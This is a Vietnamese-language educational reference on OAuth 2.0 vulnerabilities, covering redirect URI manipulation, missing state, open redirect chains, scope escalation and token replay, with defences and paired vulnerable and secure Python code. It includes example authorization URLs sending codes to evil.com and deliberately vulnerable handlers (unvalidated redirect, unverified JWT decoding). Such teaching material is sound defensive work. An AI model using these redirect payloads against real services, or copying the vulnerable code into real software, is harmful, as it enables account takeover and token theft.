# OAuth 2.0 Vulnerabilities

> **CWE**: CWE-601, CWE-287 | **Phân loại**: Authentication

## Kiến thức Nền tảng
Hãy tưởng tượng bạn đến ở tại một khách sạn sang trọng. Thay vì giao cho bạn chìa khóa vạn năng của cả tòa nhà, khách sạn cấp cho bạn một chiếc thẻ từ phòng (Access Token). Chiếc thẻ này chỉ cho phép bạn mở cửa phòng của mình và phòng tập gym trong thời gian bạn lưu trú. Bạn không cần biết mật khẩu mở cửa của ban quản lý khách sạn để vào phòng. Giao thức cấp quyền này tương tự như cách hoạt động của **OAuth 2.0**.

OAuth 2.0 là một khung ủy quyền tiêu chuẩn, cho phép các ứng dụng bên thứ ba (như một trang web chơi game) truy cập vào một số thông tin giới hạn của bạn (như danh sách bạn bè hoặc địa chỉ email) trên một ứng dụng khác (như Google hay Facebook) mà bạn không cần phải tiết lộ mật khẩu đăng nhập Google/Facebook cho trang web chơi game đó. 

Các thành phần tham gia bao gồm:
- **Resource Owner**: Chính là bạn, chủ sở hữu tài khoản.
- **Client**: Ứng dụng muốn xin quyền truy cập (như trang web chơi game).
- **Authorization Server**: Máy chủ cấp quyền (như Google, Facebook), nơi xác thực bạn và cấp thẻ từ.
- **Resource Server**: Máy chủ chứa dữ liệu thực tế (như API chứa email, ảnh của bạn).

Quy trình lấy mã ủy quyền thông thường:

```
1. User clicks "Login with Google"
2. Browser redirects to: https://accounts.google.com/authorize?
     response_type=code&
     client_id=APP_ID&
     redirect_uri=https://myapp.com/callback&
     scope=profile email&
     state=random_csrf_token

3. User approves → Google redirects to:
     https://myapp.com/callback?code=AUTH_CODE&state=random_csrf_token

4. Server exchanges code for access_token (server-to-server)
5. Server uses access_token to fetch user profile
```

```python
# Normal OAuth callback handler
@app.route('/callback')
def oauth_callback():
    # Verify state parameter to prevent CSRF
    if request.args.get('state') != session.get('oauth_state'):
        return "CSRF detected", 403
    
    code = request.args.get('code')
    
    # Exchange authorization code for access token (server-side)
    token_response = requests.post('https://oauth.provider.com/token', data={
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI,
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET
    })
    
    access_token = token_response.json()['access_token']
    user_info = fetch_user_profile(access_token)
    return login_user(user_info)
```

OAuth hoạt động đúng khi mọi tham số được validate chặt chẽ, nhưng cấu hình sai bất kỳ thành phần nào cũng tạo ra lỗ hổng nghiêm trọng.

## Mô tả lỗ hổng
Lỗ hổng OAuth 2.0 (OAuth 2.0 Vulnerabilities) xảy ra khi quá trình thiết lập và trao đổi các tham số xác thực giữa các bên bị cấu hình sai hoặc lỏng lẻo. 

Mối nguy hiểm của lỗ hổng này là cực kỳ nghiêm trọng: kẻ tấn công có thể lén lút sửa đổi địa chỉ nhận thẻ từ (redirect URI) để lừa máy chủ gửi mã xác thực (authorization code) về máy của chúng. Chúng cũng có thể lợi dụng việc thiếu tham số chống giả mạo (`state`) để ép tài khoản của bạn liên kết với tài khoản mạng xã hội của chúng, hoặc đánh cắp token của bạn thông qua các lỗi chuyển hướng trang web (Open Redirect). Một khi sở hữu được Access Token hay Refresh Token của bạn, kẻ tấn công có thể truy cập trái phép dữ liệu cá nhân của bạn vô thời hạn mà không cần biết mật khẩu.

## Cơ chế tấn công
**1. Redirect URI Manipulation — đánh cắp authorization code:**
Nếu Authorization Server cho phép so khớp tương đối hoặc wildcard đối với `redirect_uri`, attacker có thể trỏ redirect về server của chúng để lấy trộm mã code.

```
https://oauth.provider.com/authorize?response_type=code&client_id=APP_ID&redirect_uri=https://myapp.com.evil.com/steal&scope=profile
```

**2. Missing State Parameter — CSRF to link attacker's account:**
Nếu không sử dụng tham số `state` để chống CSRF, attacker có thể lừa nạn nhân nhấn vào liên kết OAuth chứa mã code của attacker, liên kết tài khoản nạn nhân với thông tin mạng xã hội của attacker.

**3. Implicit Flow Token Leakage:**
Implicit flow trả về access token trực tiếp qua URL fragment (`#access_token=...`), khiến nó dễ bị lộ qua lịch sử trình duyệt hoặc Referer header.

**4. Token Theft via Open Redirect Chain:**
Ngay cả khi server cấu hình `redirect_uri` chính xác (ví dụ: `https://myapp.com/callback`), nếu trang callback này chứa lỗ hổng Open Redirect (ví dụ: nhận tham số `?next=http://evil.com` để chuyển hướng sau khi đăng nhập), attacker có thể chuỗi chúng lại để chuyển hướng mã code hoặc token sang domain độc hại:
```
https://oauth.provider.com/authorize?response_type=code&client_id=APP_ID&redirect_uri=https://myapp.com/callback?next=http://evil.com/steal
```

**5. Scope Escalation (Leo thang phạm vi):**
Attacker chặn yêu cầu authorization và thay đổi tham số `scope` (ví dụ từ `scope=read` thành `scope=read+write+admin`). Nếu Authorization Server không hiển thị rõ ràng những quyền nâng cao này cho người dùng duyệt, hoặc Client Application mặc nhiên tin tưởng scope của token mà không xác thực lại, attacker sẽ có quyền truy cập trái phép.

**6. Authorization Code Replay:**
Mã Authorization Code chỉ được phép sử dụng một lần để đổi lấy Access Token. Nếu Authorization Server bị lỗi logic không thu hồi code sau khi sử dụng, attacker có thể chặn và dùng lại code đó để sinh ra Access Token mới.

**7. Refresh Token Abuse:**
Refresh Token thường có thời gian sống rất dài. Nếu hệ thống không áp dụng cơ chế quay vòng (Refresh Token Rotation - RTR) và attacker đánh cắp được Refresh Token, chúng có thể tạo mới các Access Token vô thời hạn để chiếm quyền kiểm soát tài khoản mà không cần tương tác với user.

### PKCE Bypass (OAuth 2.1)
PKCE (Proof Key for Code Exchange) yêu cầu client gửi `code_challenge` (SHA-256 hash của `code_verifier`) cùng request. Một số implementation lỗi:
- Chấp nhận `code_challenge_method=plain` thay vì `S256` (attacker có thể intercept verifier)
- Không kiểm tra `code_challenge` nếu không có trong request (optional mismatch)
- `state` parameter bị bypass khi server chấp nhận bất kỳ giá trị nào

## Biện pháp phòng thủ
- **Tóm tắt**: Bảo mật quy trình OAuth bằng cách kiểm tra trùng khớp tuyệt đối redirect URI, bắt buộc sử dụng tham số state ngẫu nhiên, và áp dụng luồng Authorization Code + PKCE.
- **Các bước chi tiết**:
  - **Strict redirect URI validation**: So sánh exact match (không dùng wildcard hay partial match) cho `redirect_uri`.
  - **Always use `state` parameter**: Tạo giá trị ngẫu nhiên, lưu trong session, và xác minh khi nhận callback.
  - **Use Authorization Code + PKCE**: Thay thế implicit flow bằng Authorization Code flow kết hợp PKCE cho mọi loại client.
  - **Fix Open Redirects**: Đảm bảo các endpoint callback không chuyển hướng tự do dựa trên input từ client.
  - **Scope Whitelisting & Validation**: Máy chủ tài nguyên phải luôn kiểm tra scope gắn liền với access token cho mỗi yêu cầu API.
  - **Single-use Authorization Code**: Đảm bảo mã code tự động bị hủy ngay sau khi trao đổi lần đầu tiên.
  - **Refresh Token Rotation (RTR)**: Mỗi khi sử dụng Refresh Token để lấy Access Token mới, Refresh Token cũ phải bị vô hiệu hóa và trả về một Refresh Token mới. Nếu Refresh Token cũ được sử dụng lại, vô hiệu hóa toàn bộ phiên làm việc của user đó ngay lập tức.

## Code Example
```python
# === VULNERABLE CODE ===
# 1. Vulnerable to Open Redirect Chain
@app.route('/callback')
def oauth_callback_unsafe():
    code = request.args.get('code')
    # Unvalidated 'next' parameter causes Open Redirect, leaking the Referer header to evil.com
    next_url = request.args.get('next', '/dashboard') 
    
    token = exchange_code(code)
    session['token'] = token
    return redirect(next_url)

# 2. Vulnerable to Scope Escalation (trusts token scopes blindly without server-side check)
@app.route('/api/admin/settings')
def admin_settings_unsafe():
    # Dangerous: client application trusts the scope claim inside the JWT without validating
    # with the Resource Server's access control policy
    token = request.headers.get('Authorization').split(" ")[1]
    payload = jwt.decode(token, verify=False)
    if 'admin' in payload.get('scope', ''):
        return get_admin_settings()
    return "Unauthorized", 403
```

```python
# === SECURE CODE ===
# 1. Secure Redirect and Single-use Code Verification
@app.route('/callback')
def oauth_callback_safe():
    # Verify state to prevent CSRF
    if request.args.get('state') != session.pop('oauth_state', None):
        return "CSRF detected", 403
        
    code = request.args.get('code')
    
    # Exchange code (Authorization Server enforces single-use and exact redirect_uri match)
    token_response = requests.post('https://oauth.provider.com/token', data={
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': FIXED_REDIRECT_URI,
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET
    })
    
    if token_response.status_code != 200:
        return "Failed to exchange code", 400
        
    # Safe redirect to a hardcoded dashboard or validated local path only
    return redirect('/dashboard')

# 2. Refresh Token Rotation (RTR) logic
def rotate_refresh_token(user_id, client_refresh_token):
    stored_token = db.get_refresh_token(user_id)
    
    # If the presented refresh token has already been used, trigger compromise detection
    if stored_token.is_used and stored_token.token_value == client_refresh_token:
        db.revoke_all_sessions(user_id) # Revoke all active tokens for the user
        raise SecurityException("Replay of refresh token detected! Revoking all sessions.")
        
    # Generate new access token and new refresh token (Rotation)
    new_access_token = generate_access_token(user_id)
    new_refresh_token = generate_new_refresh_token(user_id)
    
    # Mark old token as used and store new one
    db.mark_token_used(client_refresh_token)
    db.save_refresh_token(user_id, new_refresh_token)
    
    return new_access_token, new_refresh_token
```

## Xem thêm
- [Session Fixation](../session-fixation/README.md)

## Nguồn tham khảo
- PortSwigger: https://portswigger.net/web-security/oauth
- OWASP: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses
- CWE: https://cwe.mitre.org/data/definitions/601.html

## Giải thích thuật ngữ
- **OAuth 2.0**: Giao thức ủy quyền tiêu chuẩn giúp các ứng dụng chia sẻ tài nguyên với nhau một cách an toàn mà không cần chia sẻ thông tin đăng nhập trực tiếp (như mật khẩu).
- **Access Token**: Chuỗi mã ngắn hạn đại diện cho quyền truy cập được cấp cho ứng dụng để gọi API và lấy dữ liệu của người dùng.
- **Refresh Token**: Chuỗi mã dài hạn dùng để yêu cầu máy chủ cấp một Access Token mới sau khi Access Token cũ đã hết hạn mà không bắt người dùng đăng nhập lại từ đầu.
- **Redirect URI**: Địa chỉ URL mà máy chủ ủy quyền sẽ gửi trình duyệt của người dùng quay trở lại kèm theo mã code xác thực sau khi người dùng đồng ý cấp quyền.
- **PKCE (Proof Key for Code Exchange)**: Bản mở rộng bảo mật cho OAuth 2.0, sử dụng một chuỗi mật mã ngẫu nhiên để xác minh rằng ứng dụng yêu cầu token chính là ứng dụng đã yêu cầu mã code ban đầu.
- **Open Redirect (Chuyển hướng mở)**: Lỗ hổng bảo mật xảy ra khi trang web tự động chuyển hướng người dùng đến một địa chỉ URL khác do người dùng tự nhập mà không thực hiện kiểm tra độ an toàn của địa chỉ đó.
